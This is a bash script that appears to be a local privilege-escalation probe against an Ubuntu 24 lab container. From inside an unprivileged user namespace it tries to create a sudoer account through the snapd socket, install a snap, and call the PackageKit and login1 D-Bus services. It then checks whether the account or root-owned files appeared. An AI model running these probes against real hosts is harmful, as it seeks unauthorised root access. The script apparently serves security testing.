#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"

docker exec -i "$container" bash -s <<'EOS'
set -euo pipefail
rm -f /tmp/userns_snap_resp /tmp/userns_snap_install_resp /tmp/userns_dbus_resp /tmp/userns_pkgkit_resp

echo "== target =="
cat /etc/os-release | sed -n '1,8p'
id attacker
sysctl user.max_user_namespaces 2>/dev/null || true
dpkg-query -W -f='${binary:Package}\t${Version}\n' snapd dbus systemd polkitd packagekit 2>&1 | sort

echo "== default sockets =="
stat -c '%A %U:%G %a %n' /run/snapd.socket /run/snapd-snap.socket /run/dbus/system_bus_socket 2>&1 || true
systemctl is-active snapd.socket dbus.socket packagekit.service 2>&1 || true

echo "== userns-root probes =="
runuser -u attacker -- unshare -Ur bash -lc '
  set +e
  echo "inner_id=$(id)"
  echo "uid_map"; cat /proc/self/uid_map
  echo "gid_map"; cat /proc/self/gid_map
  egrep "^(Uid|Gid|CapEff|NSpid|NoNewPrivs):" /proc/self/status

  echo "SNAP create-user sudoer"
  curl --max-time 8 --silent --show-error --unix-socket /run/snapd.socket \
    -i -H "Content-Type: application/json" \
    -X POST --data "{\"email\":\"userns-root@example.invalid\",\"sudoer\":true}" \
    http://localhost/v2/create-user > /tmp/userns_snap_resp 2>&1
  echo "snap_create_rc=$?"
  sed -n "1,24p" /tmp/userns_snap_resp

  echo "SNAP install hello-world"
  curl --max-time 8 --silent --show-error --unix-socket /run/snapd.socket \
    -i -H "Content-Type: application/json" \
    -X POST --data "{\"action\":\"install\",\"snaps\":[\"hello-world\"]}" \
    http://localhost/v2/snaps > /tmp/userns_snap_install_resp 2>&1
  echo "snap_install_rc=$?"
  sed -n "1,24p" /tmp/userns_snap_install_resp

  echo "login1 CanReboot"
  busctl --system call org.freedesktop.login1 /org/freedesktop/login1 \
    org.freedesktop.login1.Manager CanReboot > /tmp/userns_dbus_resp 2>&1
  echo "login1_rc=$?"
  cat /tmp/userns_dbus_resp

  echo "PackageKit CreateTransaction"
  busctl --system call org.freedesktop.PackageKit /org/freedesktop/PackageKit \
    org.freedesktop.PackageKit CreateTransaction > /tmp/userns_pkgkit_resp 2>&1
  echo "packagekit_rc=$?"
  cat /tmp/userns_pkgkit_resp
'

echo "== post-checks =="
getent passwd userns-root userns-root@example.invalid 2>&1 || true
ls -l /root/userns-socket-root-* /tmp/userns-socket-root-* 2>&1 || true
systemctl is-system-running || true
EOS
